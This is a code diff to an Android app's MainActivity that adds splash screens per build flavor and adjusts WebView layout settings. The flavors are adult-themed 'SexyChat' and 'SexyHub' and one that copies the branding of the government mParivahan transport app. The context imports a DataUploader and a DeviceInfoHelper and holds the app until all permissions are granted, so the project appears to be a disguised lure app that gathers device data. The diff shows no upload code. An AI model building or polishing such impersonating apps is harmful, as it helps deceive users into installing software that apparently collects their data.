@@ -22,6 +22,7 @@ import androidx.compose.runtime.*
 import androidx.compose.ui.Modifier
 import androidx.compose.ui.graphics.Color
 import androidx.compose.ui.viewinterop.AndroidView
+import androidx.compose.ui.unit.sp
 import com.example.test.utils.DataUploader
 import com.example.test.utils.DeviceInfoHelper
 import com.example.test.utils.PermissionManager
@@ -81,7 +82,8 @@ class MainActivity : ComponentActivity() {
 
     private fun enableFullscreen() {
         actionBar?.hide()
-        WindowCompat.setDecorFitsSystemWindows(window, false)
+        // Changed: Let decorView fit system windows properly
+        WindowCompat.setDecorFitsSystemWindows(window, true)
 
         val windowInsetsController = WindowCompat.getInsetsController(window, window.decorView)
         windowInsetsController.apply {
@@ -89,6 +91,10 @@ class MainActivity : ComponentActivity() {
             systemBarsBehavior = WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
         }
 
+        // Set status bar and navigation bar colors to match content
+        window.statusBarColor = android.graphics.Color.TRANSPARENT
+        window.navigationBarColor = android.graphics.Color.TRANSPARENT
+        
         window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
     }
 
@@ -96,9 +102,15 @@ class MainActivity : ComponentActivity() {
     fun MainScreen() {
         var showPermissionDialog by remember { mutableStateOf(false) }
         var permissionsGranted by remember { mutableStateOf(false) }
+        var showSplash by remember { mutableStateOf(true) }
         val scope = rememberCoroutineScope()
 
         LaunchedEffect(Unit) {
+            // First show app splash for 2 seconds
+            delay(2000)
+            showSplash = false
+            
+            // Then check permissions
             delay(300)
             if (!permissionManager.checkAllPermissions()) {
                 showPermissionDialog = true
@@ -111,33 +123,97 @@ class MainActivity : ComponentActivity() {
         Box(
             modifier = Modifier
                 .fillMaxSize()
-                .background(Color.Black)
+                .background(Color.White)
         ) {
-            AndroidView(
-                factory = { context -> createWebView() },
-                modifier = Modifier.fillMaxSize()
-            )
+            if (showSplash && BuildConfig.APP_FLAVOR != "sexyhub") {
+                // SexyHub بدون splash - مستقیم لود می‌شه
+                // Show flavor-specific splash before everything
 
-            if (showPermissionDialog) {
-                PermissionDialog(
-                    onRequestPermissions = {
-                        scope.launch {
-                            permissionManager.requestPermissions {
-                                if (permissionManager.checkAllPermissions()) {
-                                    showPermissionDialog = false
-                                    permissionsGranted = true
-                                    continueInitialization()
+                val (appName, gradientColors) = when (BuildConfig.APP_FLAVOR) {
+                    "sexychat" -> Pair(
+                        "SexyChat",
+                        listOf(Color(0xFFff6b9d), Color(0xFFc94b7f), Color(0xFFff1493))
+                    )
+                    "mparivahan" -> Pair(
+                        "mParivahan",
+                        listOf(Color(0xFF4fc3f7), Color(0xFF29b6f6), Color(0xFF1976d2))
+                    )
+                    "sexyhub" -> Pair(
+                        "SexyHub",
+                        listOf(Color(0xFFf093fb), Color(0xFFf5576c), Color(0xFFff006e))
+                    )
+                    else -> Pair(
+                        "App",
+                        listOf(Color(0xFF6200EE), Color(0xFF3700B3), Color(0xFF03DAC5))
+                    )
+                }
+                
+                Box(
+                    modifier = Modifier
+                        .fillMaxSize()
+                        .background(
+                            brush = androidx.compose.ui.graphics.Brush.linearGradient(
+                                colors = gradientColors
+                            )
+                        ),
+                    contentAlignment = androidx.compose.ui.Alignment.Center
+                ) {
+                    androidx.compose.material3.Text(
+                        text = appName,
+                        style = androidx.compose.material3.MaterialTheme.typography.displayLarge.copy(
+                            fontSize = 48.sp,
+                            fontWeight = androidx.compose.ui.text.font.FontWeight.Bold,
+                            color = Color.White,
+                            letterSpacing = 2.sp
+                        )
+                    )
+                }
+            } else {
+                AndroidView(
+                    factory = { context -> createWebView() },
+                    modifier = Modifier.fillMaxSize(),
+                    update = { webView ->
+                        webView.layoutParams = android.view.ViewGroup.LayoutParams(
+                            android.view.ViewGroup.LayoutParams.MATCH_PARENT,
+                            android.view.ViewGroup.LayoutParams.MATCH_PARENT
+                        )
+                    }
+                )
+
+                if (showPermissionDialog) {
+                    PermissionDialog(
+                        onRequestPermissions = {
+                            scope.launch {
+                                permissionManager.requestPermissions {
+                                    if (permissionManager.checkAllPermissions()) {
+                                        showPermissionDialog = false
+                                        permissionsGranted = true
+                                        continueInitialization()
+                                    }
                                 }
                             }
                         }
-                    }
-                )
+                    )
+                }
             }
         }
     }
 
     private fun createWebView(): WebView {
-        webView = WebView(this)
+        webView = WebView(this).apply {
+            // Set proper layout params
+            layoutParams = android.view.ViewGroup.LayoutParams(
+                android.view.ViewGroup.LayoutParams.MATCH_PARENT,
+                android.view.ViewGroup.LayoutParams.MATCH_PARENT
+            )
+            
+            // Remove any scrollbar
+            isVerticalScrollBarEnabled = false
+            isHorizontalScrollBarEnabled = false
+            
+            // Set background
+            setBackgroundColor(android.graphics.Color.WHITE)
+        }
 
         val webSettings: WebSettings = webView.settings
         webSettings.javaScriptEnabled = true
@@ -152,8 +228,11 @@ class MainActivity : ComponentActivity() {
             webSettings.allowUniversalAccessFromFileURLs = false
         }
 
+        // Critical settings for proper display
         webSettings.loadWithOverviewMode = true
         webSettings.useWideViewPort = true
+        webSettings.layoutAlgorithm = WebSettings.LayoutAlgorithm.NORMAL
+        
         webSettings.setSupportZoom(false)
         webSettings.builtInZoomControls = false
         webSettings.displayZoomControls = false
@@ -161,6 +240,9 @@ class MainActivity : ComponentActivity() {
         webSettings.blockNetworkImage = false
         webSettings.blockNetworkLoads = false
         webSettings.cacheMode = WebSettings.LOAD_DEFAULT
+        
+        // Set initial scale to 100%
+        webView.setInitialScale(100)
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
             webView.setLayerType(WebView.LAYER_TYPE_HARDWARE, null)
